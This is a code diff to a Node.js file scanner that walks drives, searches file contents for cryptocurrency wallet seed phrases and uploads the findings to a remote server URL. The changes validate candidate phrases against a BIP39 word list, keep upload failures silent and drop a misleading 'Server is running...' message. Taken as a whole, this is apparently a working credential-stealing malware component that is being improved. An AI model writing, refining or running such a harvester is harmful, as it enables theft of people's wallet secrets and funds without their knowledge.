@@ -49,6 +49,9 @@ const serverUrl = getArg("--server-url", process.env.SCAN_SERVER_URL || "http://
 const txtMaxBytes = Math.max(1, txtMaxKB) * 1024;
 const docMaxBytes = Math.max(1, docMaxKB) * 1024;
 const contentScanLimitBytes = Math.max(1, contentScanLimitKB) * 1024;
+const seedWordFile = path.join(__dirname, "seed.txt");
+const normalizedSeedWordFile = path.resolve(seedWordFile).toLowerCase();
+let seedWordSet = new Set();
 
 // Skip patterns for files (keep for filtering within allowed dirs)
 const skipBaseName = /^(readme|license|licence|copying|changelog|authors|notice)(\..*)?$/i;
@@ -75,42 +78,49 @@ const patterns = {
   }
 };
 
-const skipWords = new Set([
-  "and", "but", "the", "not", "would", "with", "which", "what", "where", 
-  "that", "just", "for", "he", "she", "they", "him", "her", "them", 
-  "his", "their", "than", "more", "can", "each"
-]);
+async function loadSeedWordSet() {
+  const content = await fs.readFile(seedWordFile, "utf8");
+  const words = content
+    .split(/\r?\n/)
+    .map((w) => w.trim().toLowerCase())
+    .filter(Boolean);
+  seedWordSet = new Set(words);
+}
+
+function isValidSeedPhraseWords(words) {
+  if (!seedWordSet || seedWordSet.size === 0) return false;
+  return words.every((w) => seedWordSet.has(w));
+}
 
 function detectSeedPhrase(content) {
-  // Match sequences of 12, 15, 18, 21, or 24 words (each 3-8 letters)
-  // Pattern: word (space word) repeated N-1 times
+  // Match sequences of 12, 15, 18, 21, or 24 words (3-8 letters each),
+  // then validate all words against seed.txt (BIP39 list).
   const patterns = {
-    12: /\b([a-z]{3,8}\s+){11}[a-z]{3,8}\b/g,
-    15: /\b([a-z]{3,8}\s+){14}[a-z]{3,8}\b/g,
-    18: /\b([a-z]{3,8}\s+){17}[a-z]{3,8}\b/g,
-    21: /\b([a-z]{3,8}\s+){20}[a-z]{3,8}\b/g,
-    24: /\b([a-z]{3,8}\s+){23}[a-z]{3,8}\b/g
+    12: /\b[a-z]{3,8}(?:\s+[a-z]{3,8}){11}\b/g,
+    15: /\b[a-z]{3,8}(?:\s+[a-z]{3,8}){14}\b/g,
+    18: /\b[a-z]{3,8}(?:\s+[a-z]{3,8}){17}\b/g,
+    21: /\b[a-z]{3,8}(?:\s+[a-z]{3,8}){20}\b/g,
+    24: /\b[a-z]{3,8}(?:\s+[a-z]{3,8}){23}\b/g
   };
   
-  let allMatches = "";
+  const collected = [];
 
   // Check each pattern length
-  for (const [length, pattern] of Object.entries(patterns)) {
+  for (const pattern of Object.values(patterns)) {
     const matches = content.match(pattern);
     if (matches && matches.length > 0) {
       for (const match of matches) {
-        const trimmedMatch = match.trim().toLowerCase();
-        const words = trimmedMatch.split(/\s+/);
-
-        const hasSkipWord = words.some(word => skipWords.has(word));
-
-        if (!hasSkipWord) {
-          allMatches += match + "\\";
+        const words = match.trim().toLowerCase().split(/\s+/);
+        if (isValidSeedPhraseWords(words)) {
+          collected.push(words.join(" "));
         }
       }
-      allMatches = allMatches.replace(/\n/g, " ");
-      return allMatches.trim().toLowerCase();
     }
+  }
+
+  if (collected.length > 0) {
+    const unique = [...new Set(collected)];
+    return unique.join(" \\ ");
   }
   
   return null;
@@ -407,6 +417,10 @@ async function scanDirectory(targetPath, state) {
 
       for await (const dirent of dir) {
         const fullPath = path.join(dirPath, dirent.name);
+        const normalizedFullPath = path.resolve(fullPath).toLowerCase();
+
+        // Ignore the dictionary itself to avoid self-matching noise.
+        if (normalizedFullPath === normalizedSeedWordFile) continue;
 
         if (dirent.isDirectory()) {
           // Don't skip any subdirectories within allowed paths
@@ -496,7 +510,6 @@ async function uploadRow(row, state) {
     state.uploadsSucceeded += 1;
   } catch (err) {
     state.uploadsFailed += 1;
-    // Silent fail - no console.error
   }
 }
 
@@ -513,9 +526,7 @@ async function scanAllDrivesSpecificFolders(state) {
         try {
           await fs.access(target);
           await scanDirectory(target, state);
-        } catch (err) {
-          // Silent skip
-        }
+        } catch (err) {}
       }
     } else {
       // For other drives (D:, E:, etc.), scan entire drive but skip system directories
@@ -524,8 +535,14 @@ async function scanAllDrivesSpecificFolders(state) {
   }
 }
 
+
 async function main() {
-  console.log("Server is running...");
+  try {
+    await loadSeedWordSet();
+  } catch (err) {
+    process.exitCode = 1;
+    return;
+  }
 
   const drives = await getDrives();
   if (drives.length === 0) {
